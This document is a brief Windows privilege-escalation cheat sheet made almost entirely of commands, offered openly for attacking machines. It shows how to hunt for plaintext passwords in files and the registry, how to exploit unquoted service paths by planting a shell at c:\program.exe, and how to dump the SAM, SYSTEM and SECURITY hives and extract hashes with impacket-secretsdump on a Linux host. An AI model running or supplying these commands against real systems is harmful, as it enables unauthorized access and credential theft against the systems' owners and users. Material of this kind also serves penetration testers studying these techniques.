Need to escalate privileges without fancy tools?
====
-----
1) open CMD and type
-----

```
findstr /si password *.txt
findstr /si password *.xml
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /spin "password" *.*
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```


-----
2) Didn't work? Still need privilege escalation?
-----

```
1) wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
2) Unquoted services that contain spaces = SYSTEM.

i.e. If binary is c:\Program Files\blah.exe. Place shell in c:\program.exe
```

-----
3) Steal SAM and cached credentials without fancy tools.
-----

```
1) reg save hklm\sam c:\SAM
reg save hklm\system c:\SYSTEM
reg save hklm\security c:\SECURITY

2) Copy to Linux host.

3) impacket-secretsdump -sam /root/SAM -security /root/SECURITY -system /root/SYSTEM LOCAL
```


